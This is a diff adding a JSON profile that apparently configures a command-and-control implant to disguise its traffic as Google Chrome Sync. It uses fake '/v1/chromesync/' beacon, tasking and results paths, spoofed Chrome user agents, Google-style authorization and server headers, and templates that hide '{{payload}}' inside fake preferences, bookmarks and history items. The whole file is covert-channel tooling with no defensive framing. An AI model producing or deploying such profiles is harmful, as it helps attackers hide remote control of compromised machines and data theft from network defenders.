@@ -1,0 +1,60 @@
+{
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "linux_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  "beacon_path":  "/v1/chromesync/items",
+  "tasks_path":   "/v1/chromesync/updates",
+  "results_path": "/v1/chromesync/commits",
+
+  "extra_headers": {
+    "Accept": "application/json",
+    "Authorization": "Bearer ya29.a0AfH6SMB...",
+    "X-Goog-Api-Client": "gl-go/1.21.0 gccl/1.21.0"
+  },
+  "request_headers": {},
+
+  "response_headers": {
+    "Server": "ESF",
+    "X-Content-Type-Options": "nosniff",
+    "X-Frame-Options": "SAMEORIGIN"
+  },
+
+  "shaping": {
+    "checkin_response": {
+      "template": {
+        "items": [
+          {
+            "id": "AAAA-0001",
+            "datatypeId": "preferences",
+            "specifics": { "value": "{{payload}}" }
+          }
+        ]
+      },
+      "extract": "items[0].specifics.value"
+    },
+    "tasks_response": {
+      "template": {
+        "updates": [
+          {
+            "id": "AAAA-0002",
+            "datatypeId": "bookmarks",
+            "specifics": { "value": "{{payload}}" }
+          }
+        ]
+      },
+      "extract": "updates[0].specifics.value"
+    },
+    "results_request": {
+      "template": {
+        "commits": [
+          {
+            "id": "AAAA-0003",
+            "datatypeId": "history",
+            "specifics": { "value": "{{payload}}" }
+          }
+        ]
+      },
+      "extract": "commits[0].specifics.value"
+    }
+  }
+}
